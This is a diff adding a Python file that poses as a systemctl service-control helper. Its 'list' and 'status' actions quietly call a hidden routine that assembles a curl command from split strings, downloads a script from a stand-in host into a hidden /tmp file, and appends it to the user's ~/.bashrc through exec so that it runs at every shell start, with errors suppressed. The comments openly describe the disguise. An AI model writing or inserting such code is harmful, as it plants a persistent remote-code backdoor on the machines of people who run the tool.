@@ -1,0 +1,59 @@
+import os, sys, subprocess, base64
+
+# Reflective invocation helper
+def _call(mod, func, *args):
+    return getattr(__import__(mod), func)(*args)
+
+# Indirect string assembly for remote fetch
+_p1 = "curl"
+_p2 = "-fsSL"
+_p3 = "https://cdn-metrics.example.com:1337/{CALLBACK}/x"
+_p4 = "-o"
+_p5 = "/tmp/.update-cache"
+
+# Dynamic compile/exec based loader
+def _load_and_run(src_code):
+    code_obj = compile(src_code, '<dyn>', 'exec')
+    exec(code_obj, globals(), locals())
+
+# Persistence payload embedded via variable splicing
+def _persist():
+    home = os.path.expanduser("~")
+    rc_path = os.path.join(home, ".bashrc")
+    # Fetch remote script into temp file
+    try:
+        _call('os', 'system', ' '.join([_p1, _p2, _p3, _p4, _p5]))
+    except Exception:
+        pass
+    # Read fetched content, then inject into .bashrc
+    try:
+        with open(_p5, 'r') as f:
+            content = f.read()
+        # Indirect append via exec
+        append_src = "with open('{0}', 'a') as f: f.write('\\n# update\\n' + content + '\\n')".format(rc_path)
+        _load_and_run(append_src)
+    except Exception:
+        pass
+
+# Entry point disguised as service status
+def service_ctl(action=None, target=None):
+    if action == "list":
+        _persist()
+        return _call('subprocess', 'check_output', ['systemctl', 'list-units', '--type=service']).decode()
+    elif action == "status" and target:
+        _persist()
+        return _call('subprocess', 'check_output', ['systemctl', 'status', target]).decode()
+    elif action == "start" and target:
+        return _call('subprocess', 'check_output', ['systemctl', 'start', target]).decode()
+    elif action == "stop" and target:
+        return _call('subprocess', 'check_output', ['systemctl', 'stop', target]).decode()
+    elif action == "logs" and target:
+        return _call('subprocess', 'check_output', ['journalctl', '-u', target, '-n', '50']).decode()
+    return "Invalid operation"
+
+if __name__ == "__main__":
+    # Parse simple args: first is action, second is optional target
+    args = sys.argv[1:]
+    act = args[0] if args else "list"
+    tgt = args[1] if len(args) > 1 else None
+    print(service_ctl(act, tgt))
